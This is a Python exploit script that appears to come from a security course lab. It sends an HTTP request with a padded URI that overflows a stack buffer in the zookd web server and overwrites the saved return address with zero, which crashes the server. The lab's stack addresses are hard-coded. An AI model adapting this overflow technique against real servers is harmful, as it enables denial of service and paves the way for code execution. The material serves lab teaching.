#!/usr/bin/env python3
import sys
import socket
import traceback
import urllib.parse
import struct

####

## The first step to let stack overflow and overwrite the return address.
## If the return address change to 0x00, there will be segment fault happend.

####  1. To run server with:
####  ./clean-env.sh ./zookd-exstack 8080 &
####  2. To overflow the stack with:
####  ./exploit-overflow.py localhost 8080

# To overflow the reqpath buffer in the process_client function.
# All info is in the process_client frame and context.
reqpath_addr  = 0x7fffffffdcc0 

# The $rbp address in the frame of process_client
rbp_addr      = 0x7fffffffecd0
# The address of saved $rip in the frame of process_client
rip_addr      = 0x7fffffffecd8

## This is the function that you should modify to construct an
## HTTP request that will cause a buffer overflow in some part
## of the zookws web server and exploit it.

def build_exploit(shellcode):
    ## Things that you might find useful in constructing your exploit:
    ##
    ##   urllib.parse.quote_from_bytesquote(s).encode('ascii')
    ##     returns string s with "special" characters percent-encoded
    ##   struct.pack("<Q", x)
    ##     returns the 8-byte binary encoding of the 64-bit integer x
    
    # REQUEST_LINE = REQUEST_METHOD + REQUEST_URI + SERVER_PROTOCOL
    REQUEST_METHOD = b"GET"
    print("REQUEST_METHOD: " + str(REQUEST_METHOD))
    
    # REQUEST_URI = "/" + padding + overflow_addr
    # The content of REQUEST_URI will load to reqpath buffer 
    padding_len    = (rip_addr - reqpath_addr) - 1
    padding        = b"A" * padding_len
    overflow_addr = struct.pack("<Q", 0x0)
    ### So the 0x00 will terminate and break the REQUEST string.
    ### Then quote_from_byte will translate the 0x00 to %00 and 
    ### '0' in the %00 is a char(0x30) rather than 0x00.

    ### At last, the %00 will recover to 0x00 by url_encode in the http.c
    q_overflow_addr= urllib.parse.quote_from_bytes(overflow_addr).encode('ascii')
    REQUEST_URI = b"/" + padding + q_overflow_addr

    # SERVER_PROTOCOL is "HTTP/1.0"
    SERVER_PROTOCOL = b"HTTP/1.0"

    space = b"\x20"
    end   = b"\r\n"

    # REQUEST_LINE = REQUEST_METHOD + REQUEST_URI + SERVER_PROTOCOL
    REQUEST_LINE = REQUEST_METHOD + space + REQUEST_URI + space + SERVER_PROTOCOL + end

    # REQUEST = REQUEST_LINE + REQUEST_HEADER
    REQUEST = REQUEST_LINE + \
              end

    return REQUEST

####

def send_req(host, port, req):
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    print("Connecting to %s:%d..." % (host, port))
    sock.connect((host, port))

    print("Connected, sending request...")
    sock.send(req)

    print("Request sent, waiting for reply...")
    rbuf = sock.recv(1024)
    resp = b""

    while len(rbuf):
        resp = resp + rbuf
        rbuf = sock.recv(1024)

    print("Received reply.")
    sock.close()
    return resp

####

if len(sys.argv) != 3:
    print("Usage: " + sys.argv[0] + " host port")
    exit()

try:
    shellfile = open("shellcode.bin", "rb")
    shellcode = shellfile.read()
    req = build_exploit(shellcode)
    print("HTTP request:")
    print(req)

    resp = send_req(sys.argv[1], int(sys.argv[2]), req)
    print("HTTP response:")
    print(resp)
except:
    print("Exception:")
    print(traceback.format_exc())

